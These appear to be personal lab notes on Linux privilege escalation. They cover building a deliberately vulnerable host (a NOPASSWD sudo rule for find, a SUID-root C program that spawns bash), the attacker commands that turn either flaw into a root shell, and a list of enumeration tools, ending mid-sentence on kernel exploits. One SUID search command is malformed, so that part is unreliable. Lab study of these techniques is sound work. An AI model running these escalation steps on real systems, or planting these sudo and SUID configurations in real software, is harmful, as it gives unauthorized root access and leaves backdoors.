# Using find command
Victim
```
#useradd -m -s /bin/bash student
#passwd student
#apt install openssh-server -y
#systemctl enable --now ssh
#echo "student ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/student
```

Attacker
```
ssh student@victim's_IP
sudo -l
find . -exec /bin/bash \; -quit (You can get the command using gtfobins.org)
```


# Using SUID
On Victim's Machine
#vim /tmp/rootbash.c
```
#include <unistd.h>
#include <stdlib.h>

int main() { 
    setuid(0); 
    system("/bin/bash");
    return 0;
}
```
#gcc /tmp/rootbash.c -o /usr/local/bin/rootbash
#chmod u+s /usr/local/bin/rootbash

On Attacker's Machine
ssh username@Victim's_IP
find -la -perm -4000 -type
/usr/local/bin/rootbash

# Linux Enumeration Tools:
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

## Kernel exploit methodology is simple
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploi


